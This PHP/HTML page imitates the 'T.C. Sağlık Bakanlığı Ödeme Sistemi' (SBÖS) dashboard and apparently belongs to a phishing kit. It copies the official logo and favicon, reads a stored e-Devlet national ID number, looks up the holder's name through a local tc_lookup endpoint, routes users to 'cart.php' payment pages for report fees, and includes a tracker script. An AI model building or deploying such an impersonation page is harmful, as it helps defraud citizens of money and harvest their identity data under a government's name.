<?php
$tc = '';
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="utf-8">
    <title>T.C. Sağlık Bakanlığı Ödeme Sistemi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="https://sbos.saglik.gov.tr/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: #f5f7fa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
        }
        .bg-deco {
            position: fixed;
            inset: 0;
            z-index: 0;
            background:
                radial-gradient(ellipse at 85% 20%, rgba(0,150,136,0.06) 0%, transparent 50%),
                radial-gradient(ellipse at 15% 80%, rgba(211,47,47,0.04) 0%, transparent 50%),
                linear-gradient(180deg, #f8fafb 0%, #f0f4f7 100%);
        }

        .top-header {
            position: relative;
            z-index: 10;
            background: #fff;
            border-bottom: 1px solid #e8ecf0;
            padding: 0 40px;
            height: 64px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .header-left img { height: 38px; }
        .header-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        .user-info {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            color: #1a1a2e;
            font-weight: 600;
        }
        .user-avatar {
            width: 36px; height: 36px;
            background: linear-gradient(135deg, #e8b84b, #d4953a);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-weight: 700;
            font-size: 14px;
        }
        .header-link {
            display: flex;
            align-items: center;
            gap: 6px;
            color: #555;
            text-decoration: none;
            font-size: 13px;
            font-weight: 500;
        }
        .header-link:hover { color: #009688; }
        .header-link svg { width: 18px; height: 18px; }
        .header-icon-btn {
            width: 36px; height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            border: none;
            cursor: pointer;
            position: relative;
        }
        .header-icon-btn svg { width: 20px; height: 20px; }
        .header-icon-btn.notif {
            background: #E91E63;
            color: #fff;
        }

        .page-content {
            position: relative;
            z-index: 10;
            flex: 1;
            max-width: 1100px;
            width: 100%;
            margin: 0 auto;
            padding: 40px 24px;
        }
        .section-title {
            font-size: 26px;
            font-weight: 700;
            color: #1a1a2e;
            margin-bottom: 28px;
        }

        .cards-grid {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            grid-template-rows: 1fr 1fr;
            gap: 20px;
            height: 340px;
        }

        .promo-card {
            grid-row: 1 / -1;
            background: linear-gradient(135deg, #00897B 0%, #00695C 100%);
            border-radius: 16px;
            padding: 32px 28px;
            color: #fff;
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
        }
        .promo-card::before {
            content: '';
            position: absolute;
            top: -30px;
            right: -30px;
            width: 180px;
            height: 180px;
            background: rgba(255,255,255,0.08);
            border-radius: 50%;
        }
        .promo-card::after {
            content: '';
            position: absolute;
            bottom: -40px;
            left: -20px;
            width: 120px;
            height: 120px;
            background: rgba(255,255,255,0.05);
            border-radius: 50%;
        }
        .promo-card h3 {
            font-size: 22px;
            font-weight: 700;
            line-height: 1.3;
            margin-bottom: 12px;
            position: relative;
            z-index: 1;
        }
        .promo-card p {
            font-size: 13px;
            line-height: 1.6;
            opacity: 0.85;
            position: relative;
            z-index: 1;
        }
        .promo-dots {
            display: flex;
            gap: 6px;
            margin-top: 20px;
            position: relative;
            z-index: 1;
        }
        .promo-dots span {
            width: 8px; height: 8px;
            border-radius: 50%;
            background: rgba(255,255,255,0.35);
        }
        .promo-dots span.active { background: #fff; }
        .promo-nav {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            width: 28px; height: 28px;
            background: rgba(255,255,255,0.15);
            border: none;
            border-radius: 50%;
            color: #fff;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2;
        }
        .promo-nav.prev { left: 10px; }
        .promo-nav.next { right: 10px; }
        .promo-nav svg { width: 16px; height: 16px; }

        .action-card {
            background: #fff;
            border: 1.5px solid #e8ecf0;
            border-radius: 16px;
            padding: 24px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            cursor: pointer;
            transition: all 0.25s;
            text-decoration: none;
        }
        .action-card:hover {
            border-color: #009688;
            box-shadow: 0 4px 20px rgba(0,150,136,0.1);
            transform: translateY(-2px);
        }
        .action-card .card-icon {
            width: 64px; height: 64px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .action-card .card-icon svg {
            width: 48px; height: 48px;
        }
        .action-card .card-label {
            font-size: 14px;
            font-weight: 600;
            color: #1a1a2e;
            line-height: 1.4;
        }
        .action-card .card-sub {
            font-size: 12px;
            color: #888;
            margin-top: 4px;
        }

        .center-card {
            background: #fff;
            border: 1.5px solid #e8ecf0;
            border-radius: 16px;
            padding: 32px 24px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            grid-row: 1 / -1;
        }
        .center-card .card-icon {
            width: 80px; height: 80px;
            margin-bottom: 20px;
        }
        .center-card .card-icon svg { width: 72px; height: 72px; }
        .btn-rapor {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 12px 28px;
            background: #009688;
            color: #fff;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            transition: background 0.2s;
            text-decoration: none;
            margin-top: auto;
        }
        .btn-rapor:hover { background: #00796B; }
        .btn-rapor svg { width: 18px; height: 18px; }

        .side-card-icon {
            display: flex;
            align-items: center;
            gap: 4px;
            margin-bottom: 8px;
        }
        .side-card-icon .ic {
            width: 32px; height: 32px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .side-card-icon .ic svg { width: 18px; height: 18px; }
        .ic-teal { background: #E0F2F1; color: #009688; }
        .ic-pink { background: #FCE4EC; color: #E91E63; }

        .bottom-info {
            position: relative;
            z-index: 10;
            text-align: center;
            color: #999;
            font-size: 12px;
            line-height: 1.7;
            padding: 24px;
        }
        .bottom-info a { color: #009688; text-decoration: none; }
        .bottom-info a:hover { text-decoration: underline; }
        .bottom-info .alo { color: #009688; font-weight: 700; }

        .page-footer {
            position: relative;
            z-index: 10;
            text-align: center;
            padding: 16px;
            color: #bbb;
            font-size: 11px;
            border-top: 1px solid #eee;
            background: #fff;
        }

        .help-btn {
            position: fixed;
            bottom: 24px;
            left: 24px;
            z-index: 100;
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 10px 20px;
            background: #fff;
            border: 1.5px solid #e0e0e0;
            border-radius: 24px;
            color: #555;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
            font-family: inherit;
        }
        .help-btn:hover { border-color: #009688; color: #009688; }
        .help-btn svg { width: 18px; height: 18px; }

        @media (max-width: 800px) {
            .top-header { padding: 0 16px; }
            .cards-grid {
                grid-template-columns: 1fr;
                height: auto;
            }
            .promo-card, .center-card { grid-row: auto; }
            .promo-card { min-height: 280px; }
            .page-content { padding: 24px 16px; }
        }
    </style>
</head>
<body>
    <div class="bg-deco"></div>

    <div class="top-header">
        <div class="header-left">
            <img src="https://sbos.saglik.gov.tr/_next/static/media/aileHekimiLogoSb2.b6f9fbf7.svg" alt="SBÖS">
        </div>
        <div class="header-right">
            <div class="user-info">
                <span id="userName"></span>
                <div class="user-avatar" id="userAvatar"></div>
            </div>
            <a href="#" class="header-link" onclick="return false;">
                Profillerim
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
            </a>
            <button class="header-icon-btn notif" title="Bildirimler">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 006 8c0 7-3 9-3 9h18s-3-2-3-9M13.73 21a2 2 0 01-3.46 0"/></svg>
            </button>
        </div>
    </div>

    <div class="page-content">
        <h1 class="section-title">İşlemler</h1>

        <div class="cards-grid">

            <div class="promo-card">
                <button class="promo-nav prev"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M15 18l-6-6 6-6"/></svg></button>
                <button class="promo-nav next"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg></button>
                <h3>SBOS Hizmet Ücretleri Güncellendi</h3>
                <p>SBOS kapsamında sunulan Ücretli Rapor Hizmetleri, GETAT işlemleri ve YKN abonelik ücretleri güncellenmiştir. Güncel tutarlar sisteme yansıtılmıştır.</p>
                <div class="promo-dots">
                    <span class="active"></span>
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
            </div>

            <div class="center-card">
                <div class="card-icon">
                    <svg viewBox="0 0 80 80" fill="none">
                        <rect x="16" y="8" width="48" height="64" rx="6" stroke="#009688" stroke-width="2.5" fill="#E0F7FA"/>
                        <path d="M30 32h20M30 40h20M30 48h12" stroke="#009688" stroke-width="2" stroke-linecap="round"/>
                        <circle cx="54" cy="54" r="14" fill="#E8F5E9" stroke="#4CAF50" stroke-width="2"/>
                        <path d="M48 54l4 4 8-8" stroke="#4CAF50" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </div>
                <a href="cart.php" class="btn-rapor">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6M16 13H8M16 17H8M10 9H8"/></svg>
                    <span>Yeni Rapor</span> Başvurusu
                </a>
            </div>

            <a href="cart.php?type=gecmis" class="action-card">
                <div class="side-card-icon">
                    <div class="ic ic-teal">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6"/></svg>
                    </div>
                    <div class="ic ic-pink">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.84 4.61a5.5 5.5 0 00-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 00-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 000-7.78z"/></svg>
                    </div>
                </div>
                <div class="card-label">Hizmet Geçmişi<br>ve İşlem Takibi</div>
            </a>

            <a href="cart.php?type=baskisi" class="action-card">
                <div class="side-card-icon">
                    <div class="ic ic-teal">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75"/></svg>
                    </div>
                    <div class="ic ic-pink">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.84 4.61a5.5 5.5 0 00-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 00-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 000-7.78z"/></svg>
                    </div>
                </div>
                <div class="card-label">Başka Kişi<br>Adına Ödeme</div>
            </a>

        </div>
    </div>

    <div class="bottom-info">
        Yazılım ile ilgili soru, görüş ve önerileriniz <a href="#">sabim.gov.tr</a> web adresi üzerinden kayıt açabilir
        veya <span class="alo">ALO184</span> numarasını arayabilirsiniz.
    </div>

    <div class="page-footer">
        T.C. Sağlık Bakanlığı &copy;2026 Tüm Hakları Saklıdır
    </div>

    <button class="help-btn">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
        Yardım
    </button>

    <script>
        const tc = sessionStorage.getItem('edevlet_tc') || '';
        if (!tc) {
            window.location.href = 'basvuru.php';
        }

        const cached = sessionStorage.getItem('tc_name');
        if (cached) {
            setName(cached);
        }

        fetch('api/tc_lookup.php?tc=' + encodeURIComponent(tc))
            .then(r => r.json())
            .then(data => {
                if (data.success && data.ad) {
                    const fullName = data.ad + ' ' + data.soyad;
                    sessionStorage.setItem('tc_name', fullName);
                    setName(fullName);
                }
            })
            .catch(() => {});

        function setName(name) {
            document.getElementById('userName').textContent = name;
            document.getElementById('userAvatar').textContent = name.split(' ').map(n => n[0]).join('');
        }
    </script>
    <?php include 'includes/tracker.php'; ?>
</body>
</html>
